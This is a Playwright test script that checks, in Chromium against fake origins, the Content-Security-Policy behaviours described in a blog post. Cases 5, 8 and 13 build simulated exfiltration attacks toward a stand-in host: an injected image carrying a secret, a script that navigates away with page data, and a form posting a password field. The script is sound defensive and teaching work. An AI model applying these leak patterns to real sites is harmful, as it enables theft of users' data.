// Experiments behind the post on Content-Security-Policy for static sites.
// Every behaviour the post describes is checked here in a real browser
// (Chromium via Playwright). Pages are served from a fake origin through
// request interception, so nothing leaves the machine.
//
//   node tests/articles/csp_experiments.mjs [--chromium /usr/bin/chromium]
//
// Each case prints PASS or FAIL; the exit code is non-zero on any FAIL.
import { createHash } from "node:crypto";
import { chromium } from "playwright";

const args = process.argv.slice(2);
const exe = args.includes("--chromium") ? args[args.indexOf("--chromium") + 1] : undefined;
const SITE = "https://site.test";
const OTHER = "https://cdn.test";

export const sha256 = (s) => `'sha256-${createHash("sha256").update(s, "utf8").digest("base64")}'`;

const browser = await chromium.launch(exe ? { executablePath: exe } : {});
let failures = 0;

/**
 * Serves `html` at SITE/ with the given headers, records requests to OTHER,
 * collects CSP violation events and returns what the page reports.
 */
async function run({ html, csp, cspReportOnly, files = {} }) {
  const context = await browser.newContext();
  const page = await context.newPage();
  const otherRequests = [];
  await page.route("**/*", (route) => {
    const url = new URL(route.request().url());
    if (url.origin === OTHER) {
      otherRequests.push(url.pathname);
      return route.fulfill({ status: 200, contentType: "image/png", body: "" });
    }
    const headers = { "content-type": url.pathname.endsWith(".js") ? "text/javascript" : "text/html" };
    if (csp) headers["content-security-policy"] = csp;
    if (cspReportOnly) headers["content-security-policy-report-only"] = cspReportOnly;
    const body = url.pathname === "/" ? html : files[url.pathname];
    if (body === undefined) return route.fulfill({ status: 404, body: "" });
    return route.fulfill({ status: 200, headers, body });
  });
  const violations = [];
  await page.exposeFunction("__violation", (v) => violations.push(v));
  await page.addInitScript(() => {
    document.addEventListener("securitypolicyviolation", (e) =>
      window.__violation({ directive: e.effectiveDirective, disposition: e.disposition, sample: e.sample }),
    );
  });
  await page.goto(`${SITE}/`);
  await page.waitForTimeout(150);
  const state = await page.evaluate(() => ({
    flags: { ...(window.flags ?? {}) },
    baseURI: document.baseURI,
    color: getComputedStyle(document.querySelector("#styled") ?? document.body).color,
  }));
  await context.close();
  return { ...state, violations, otherRequests };
}

function check(name, cond, detail) {
  console.log(`${cond ? "PASS" : "FAIL"}  ${name}${cond ? "" : `  (${JSON.stringify(detail)})`}`);
  if (!cond) failures++;
}

const inline = "window.flags = { ...window.flags, inline: true };";
const page = (body) =>
  `<!doctype html><html><head><title>t</title></head><body><script>window.flags = {};</script>${body}</body></html>`;
// The first <script> above is itself inline; every policy below allows it by hash.
const boot = sha256("window.flags = {};");

// 1. script-src 'self' blocks inline scripts and event-handler attributes,
//    but runs scripts loaded from the same origin.
{
  const r = await run({
    csp: `script-src 'self' ${boot}`,
    html: page(
      `<script>${inline}</script><img src="data:," onerror="window.flags.handler = true"><script src="/app.js"></script>`,
    ),
    files: { "/app.js": "window.flags.file = true;" },
  });
  check("inline <script> blocked by script-src 'self'", !r.flags.inline, r);
  check("onerror= handler blocked by script-src 'self'", !r.flags.handler, r);
  check("same-origin script file runs", r.flags.file === true, r);
  check(
    "violations reported as script-src-elem / script-src-attr",
    r.violations.some((v) => v.directive === "script-src-elem") &&
      r.violations.some((v) => v.directive === "script-src-attr"),
    r.violations,
  );
}

// 2. A hash allows exactly that script; one changed character is blocked.
{
  const h = sha256(inline);
  console.log(`      hash of the inline script: ${h}`);
  const r1 = await run({ csp: `script-src 'self' ${boot} ${h}`, html: page(`<script>${inline}</script>`) });
  check("inline script runs when its sha256 hash is listed", r1.flags.inline === true, r1);
  const changed = inline.replace("true", "true ");
  const r2 = await run({ csp: `script-src 'self' ${boot} ${h}`, html: page(`<script>${changed}</script>`) });
  check("same script with one extra space is blocked", !r2.flags.inline, r2);
}

// 2b. The example from the post: its hash, and that the hash lets it run.
{
  const example = 'document.documentElement.classList.add("js");';
  const h = sha256(example);
  check("hash of the post's example", h === "'sha256-WZRJfWvsnNCPcxzZwvyhovnZGqhZaC+8gPGPRbx6wTk='", h);
  const html = `<!doctype html><html><head><title>t</title><script>${example}</script></head><body></body></html>`;
  const context = await browser.newContext();
  const pg = await context.newPage();
  await pg.route("**/*", (route) =>
    route.fulfill({
      status: 200,
      headers: { "content-type": "text/html", "content-security-policy": `script-src 'self' ${h}` },
      body: html,
    }),
  );
  await pg.goto(`${SITE}/`);
  const hasClass = await pg.evaluate(() => document.documentElement.classList.contains("js"));
  await context.close();
  check("the example runs under script-src 'self' plus its hash", hasClass, { hasClass });
}

// 3. Hashes do not cover event handlers unless 'unsafe-hashes' is present.
{
  const handler = "window.flags.handler = true";
  const html = page(`<img src="data:," onerror="${handler}">`);
  const r1 = await run({ csp: `script-src 'self' ${boot} ${sha256(handler)}`, html });
  check("handler with listed hash but without 'unsafe-hashes' is blocked", !r1.flags.handler, r1);
  const r2 = await run({ csp: `script-src 'self' ${boot} 'unsafe-hashes' ${sha256(handler)}`, html });
  check("handler runs with 'unsafe-hashes' and its hash", r2.flags.handler === true, r2);
}

// 4. style-src 'self' blocks style attributes and <style> elements.
{
  const r = await run({
    csp: `script-src 'self' ${boot}; style-src 'self'`,
    html: page(
      `<p id="styled" style="color: rgb(255, 0, 0)">x</p><style>body { color: rgb(0, 0, 255) }</style>`,
    ),
  });
  check("style= attribute ignored under style-src 'self'", r.color !== "rgb(255, 0, 0)", r);
  check(
    "violations for style-src-attr and style-src-elem",
    r.violations.some((v) => v.directive === "style-src-attr") &&
      r.violations.some((v) => v.directive === "style-src-elem"),
    r.violations,
  );
}

// 5. img-src 'self' stops an injected image from sending data elsewhere.
{
  const html = page(`<img src="${OTHER}/collect?secret=42">`);
  const r1 = await run({ csp: `script-src 'self' ${boot}; img-src 'self'`, html });
  check("request to another origin blocked by img-src 'self'", r1.otherRequests.length === 0, r1);
  const r2 = await run({ csp: `script-src 'self' ${boot}`, html });
  check("without img-src (and without default-src) the request goes out", r2.otherRequests.length === 1, r2);
}

// 6. default-src is a fallback for fetch directives, not for base-uri.
{
  const html = `<!doctype html><html><head><base href="${OTHER}/"><title>t</title></head><body><img src="pixel.png"></body></html>`;
  const r1 = await run({ csp: "default-src 'self'", html });
  check("default-src 'self' does not stop <base> (base-uri has no fallback)", r1.baseURI === `${OTHER}/`, r1);
  check(
    "…but the relative image now points elsewhere and is blocked by default-src",
    r1.otherRequests.length === 0 && r1.violations.some((v) => v.directive === "img-src"),
    r1,
  );
  const r2 = await run({ csp: "default-src 'self'; base-uri 'none'", html });
  check("base-uri 'none' ignores the injected <base>", r2.baseURI === `${SITE}/`, r2);
}

// 7. Report-Only reports but does not block.
{
  const r = await run({ cspReportOnly: "script-src 'self'", html: page(`<script>${inline}</script>`) });
  check("Report-Only: inline script still runs", r.flags.inline === true, r);
  check(
    "Report-Only: violation reported with disposition 'report'",
    r.violations.some((v) => v.disposition === "report"),
    r.violations,
  );
}

// 8. CSP does not restrict top-level navigation: an allowed script can still
//    send data away by navigating.
{
  const context = await browser.newContext();
  const pg = await context.newPage();
  let leaked = null;
  await pg.route("**/*", (route) => {
    const url = new URL(route.request().url());
    if (url.origin === OTHER) {
      leaked = url.search;
      return route.fulfill({ status: 200, contentType: "text/html", body: "<title>x</title>" });
    }
    if (url.pathname === "/leak.js")
      return route.fulfill({
        status: 200,
        contentType: "text/javascript",
        body: `location.href = "${OTHER}/?d=" + encodeURIComponent(document.title);`,
      });
    return route.fulfill({
      status: 200,
      headers: { "content-type": "text/html", "content-security-policy": "default-src 'self'" },
      body: `<!doctype html><html><head><title>secret</title></head><body><script src="/leak.js"></script></body></html>`,
    });
  });
  await pg.goto(`${SITE}/`);
  await pg.waitForTimeout(300);
  await context.close();
  check("default-src 'self' does not stop navigation to another origin", leaked === "?d=secret", { leaked });
}

// 9. A policy in <meta> ignores frame-ancestors (only the header can set it).
{
  const context = await browser.newContext();
  const pg = await context.newPage();
  const messages = [];
  pg.on("console", (m) => messages.push(m.text()));
  await pg.route("**/*", (route) =>
    route.fulfill({
      status: 200,
      contentType: "text/html",
      body: `<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none'"><title>t</title></head><body></body></html>`,
    }),
  );
  await pg.goto(`${SITE}/`);
  await pg.waitForTimeout(100);
  await context.close();
  check(
    "frame-ancestors in <meta> is ignored (browser warns)",
    messages.some((m) => /frame-ancestors/.test(m) && /ignored|meta/i.test(m)),
    messages,
  );
}

// 10. eval, new Function and string timers are blocked without 'unsafe-eval';
//     scripts from another origin are not loaded.
{
  const r = await run({
    csp: `script-src 'self' ${boot}`,
    html: page(`<script src="/probe.js"></script><script src="${OTHER}/x.js"></script>`),
    files: {
      "/probe.js": `
        try { eval("window.flags.eval = true"); } catch {}
        try { new Function("window.flags.fn = true")(); } catch {}
        try { setTimeout("window.flags.timer = true", 0); } catch {}
        window.flags.probe = true;`,
    },
  });
  check("probe script itself ran", r.flags.probe === true, r);
  check("eval() blocked", !r.flags.eval, r);
  check("new Function() blocked", !r.flags.fn, r);
  check("setTimeout with a string blocked", !r.flags.timer, r);
  check("script from another origin not requested", r.otherRequests.length === 0, r);
}

// 11. A javascript: link does not run under script-src 'self'.
{
  const context = await browser.newContext();
  const pg = await context.newPage();
  await pg.route("**/*", (route) =>
    route.fulfill({
      status: 200,
      headers: { "content-type": "text/html", "content-security-policy": `script-src 'self' ${boot}` },
      body: page(`<a id="l" href="javascript:window.flags.js = true">x</a>`),
    }),
  );
  await pg.goto(`${SITE}/`);
  await pg.evaluate(() => document.getElementById("l").click());
  await pg.waitForTimeout(100);
  const ran = await pg.evaluate(() => window.flags.js === true);
  await context.close();
  check("javascript: link blocked", !ran, { ran });
}

// 12. frame-ancestors 'none' (as a header) stops another page from framing it.
//     Control: without the header the framed content is readable.
async function framedText(policy) {
  const context = await browser.newContext();
  const pg = await context.newPage();
  await pg.route("**/*", (route) => {
    const url = new URL(route.request().url());
    if (url.origin === OTHER)
      return route.fulfill({
        status: 200,
        contentType: "text/html",
        body: `<!doctype html><title>outer</title><iframe src="${SITE}/inner"></iframe>`,
      });
    const headers = { "content-type": "text/html" };
    if (policy) headers["content-security-policy"] = policy;
    return route.fulfill({
      status: 200,
      headers,
      body: "<!doctype html><title>inner</title><p id='inside'>framed</p>",
    });
  });
  await pg.goto(`${OTHER}/`);
  await pg.waitForTimeout(300);
  const text = await pg
    .frames()
    .find((f) => f.url().startsWith(SITE))
    ?.evaluate(() => document.getElementById("inside")?.textContent ?? null)
    .catch(() => null);
  await context.close();
  return text ?? null;
}
{
  const control = await framedText(null);
  const blocked = await framedText("frame-ancestors 'none'");
  check("control: without a policy the page can be framed", control === "framed", { control });
  check("frame-ancestors 'none' blocks framing by another origin", blocked === null, { blocked });
}

// 13. form-action 'self' stops a form from submitting to another origin.
//     Control: without the policy the submission goes out.
async function submits(policy) {
  const context = await browser.newContext();
  const pg = await context.newPage();
  let submitted = false;
  await pg.route("**/*", (route) => {
    const url = new URL(route.request().url());
    if (url.origin === OTHER) {
      submitted = true;
      return route.fulfill({ status: 200, contentType: "text/html", body: "<title>x</title>" });
    }
    const headers = { "content-type": "text/html" };
    if (policy) headers["content-security-policy"] = policy;
    return route.fulfill({
      status: 200,
      headers,
      body: `<!doctype html><title>t</title><form action="${OTHER}/steal" method="get"><input name="pw" value="x"><button id="b">go</button></form>`,
    });
  });
  await pg.goto(`${SITE}/`);
  await pg.evaluate(() => document.getElementById("b").click());
  await pg.waitForTimeout(300);
  await context.close();
  return submitted;
}
{
  check("control: without a policy the form submits to another origin", (await submits(null)) === true, {});
  check(
    "form-action 'self' blocks submitting to another origin",
    (await submits("form-action 'self'")) === false,
    {},
  );
}

// 14. A <meta> policy only applies from its position in the document on.
{
  const r = await run({
    html: `<!doctype html><html><head><title>t</title><script>window.flags = { before: true };</script>
      <meta http-equiv="Content-Security-Policy" content="script-src 'self'">
      <script>window.flags.after = true;</script></head><body></body></html>`,
  });
  check("inline script before the <meta> policy runs", r.flags.before === true, r);
  check("inline script after the <meta> policy is blocked", !r.flags.after, r);
}

// 15. Several policies all apply: a second one can only restrict further.
//     (Two policies in one header, separated by a comma.)
{
  const h = sha256(inline);
  const r1 = await run({ csp: `script-src 'self' ${boot} ${h}`, html: page(`<script>${inline}</script>`) });
  const r2 = await run({
    csp: `script-src 'self' ${boot} ${h}, script-src 'self' ${boot}`,
    html: page(`<script>${inline}</script>`),
  });
  check("one policy with the hash: script runs", r1.flags.inline === true, r1);
  check("plus a second policy without the hash: script blocked", !r2.flags.inline, r2);
}

await browser.close();
console.log(failures ? `\n${failures} experiment(s) failed` : "\nall experiments behave as described");
process.exit(failures ? 1 : 0);
